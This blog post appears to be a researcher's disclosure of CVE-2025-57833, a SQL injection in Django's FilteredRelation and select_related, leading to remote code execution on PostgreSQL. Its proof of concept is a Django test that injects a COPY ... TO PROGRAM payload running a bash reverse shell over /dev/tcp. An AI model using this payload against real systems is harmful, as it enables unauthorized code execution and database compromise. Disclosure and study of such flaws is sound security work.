---
title: Django Unauthenticated, 0 click, RCE, and SQL Injection using default configuration.
url: https://infosecwriteups.com/django-unauthenticated-0-click-rce-and-sql-injection-using-default-configuration-059964f3f898?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2025-09-06
fetch_date: 2025-10-02T19:44:27.706553
---

# Django Unauthenticated, 0 click, RCE, and SQL Injection using default configuration.

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F059964f3f898&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fdjango-unauthenticated-0-click-rce-and-sql-injection-using-default-configuration-059964f3f898&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fdjango-unauthenticated-0-click-rce-and-sql-injection-using-default-configuration-059964f3f898&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-059964f3f898---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-059964f3f898---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# CVE-2025–57833: Django Unauthenticated, 0 click, RCE, and SQL Injection using default configuration.

[![EyalSec](https://miro.medium.com/v2/resize:fill:64:64/1*FF3eJCMjuj2_zXz2ztJz9g.png)](https://medium.com/%40EyalSec?source=post_page---byline--059964f3f898---------------------------------------)

[EyalSec](https://medium.com/%40EyalSec?source=post_page---byline--059964f3f898---------------------------------------)

2 min read

·

Sep 3, 2025

--

1

Listen

Share

Article about the critical CVE-2025–57833 I found in Django.

Press enter or click to view image in full size

![]()

### Impact:

RCE on PostgreSQL and SQL Injection on all of the databases.

### Vulnerable code:

![]()

### Vulnerability detection:

In order for you to be vulnerable, you need to use the ‘FilteredRelation’ function as above, with ‘select\_related’. An attacker with control over the ‘FilteredRelation’ and the ‘select\_related’ as above will be able to exploit the vulnerability.

### Exploit:

The ‘select\_related’ argument is the one that gets into the SQL query; however, Django checks in the above code that the first ‘user\_data’ and the second ‘user\_data’ are the same. The above code will not work because of the + “e”.

### Obtain RCE:

The code below will use PostgreSQL “copy” and “program” to execute a reverse shell:

```
 def test_select_related_foreign_key_sqli(self):
        user_data = 'author_join."id", author_join."name", author_join."content_type_id", author_join."object_id" FROM "filtered_relation_book" INNER JOIN "filtered_relation_author" author_join ON ("filtered_relation_book"."author_id" = author_join."id") ; COPY (SELECT \'\') TO PROGRAM \'bash -i >& /dev/tcp/127.0.0.1/1025 0>&1\'; -- '

        qs = (
            Book.objects.annotate(**{
                user_data: FilteredRelation("author"),
        })
            .select_related(user_data)
        )

        qs._fetch_all()
```

### Proof of Concept (PoC):

Press enter or click to view image in full size

![]()

EyalSec CVEs:

<https://github.com/EyalSec/EyalSec_CVE/>

If you have any questions or you want to collaborate with me, you can email me at: eyal@eyalsec.com

![]()

[Cve](https://medium.com/tag/cve?source=post_page-----059964f3f898---------------------------------------)

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----059964f3f898---------------------------------------)

[Penetration Testing](https://medium.com/tag/penetration-testing?source=post_page-----059964f3f898---------------------------------------)

[Hacking](https://medium.com/tag/hacking?source=post_page-----059964f3f898---------------------------------------)

--

--

1

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:96:96/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--059964f3f898---------------------------------------)

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:128:128/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--059964f3f898---------------------------------------)

Follow

[## Published in InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---post_publication_info--059964f3f898---------------------------------------)

[71K followers](/followers?source=post_page---post_publication_info--059964f3f898---------------------------------------)

·[Last published 4 days ago](/how-to-find-p1-bugs-using-google-in-your-target-part-1-e37455324dc1?source=post_page---post_publication_info--059964f3f898---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow

[![EyalSec](https://miro.medium.com/v2/resize:fill:96:96/1*FF3eJCMjuj2_zXz2ztJz9g.png)](https://medium.com/%40EyalSec?source=post_page---post_author_info--059964f3f898---------------------------------------)

[![EyalSec](https://miro.medium.com/v2/resize:fill:128:128/1*FF3eJCMjuj2_zXz2ztJz9g.png)](https://medium.com/%40EyalSec?source=post_page---post_author_info--059964f3f898---------------------------------------)

[## Written by EyalSec](https://medium.com/%40EyalSec?source=post_page---post_author_info--059964f3f898---------------------------------------)

[40 followers](https://medium.com/%40EyalSec/followers?source=post_page---post_author_info--059964f3f898---------------------------------------)

·[0 following](https://medium.com/%40EyalSec/following?source=post_page---post_author_info--059964f3f898---------------------------------------)

## Responses (1)

See all responses

[Help](https://help.medium.com/hc/en-us?source=post_page-----059964f3f898---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----059964f3f898---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----059964f3f898---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----059964f3f898---------------------------------------)

Press

[Blog](https://blog.medium.com/?source=post_page-----059964f3f898---------------------------------------)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----059964f3f898---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----059964f3f898---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----059964f3f898---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----059964f3f898-----------...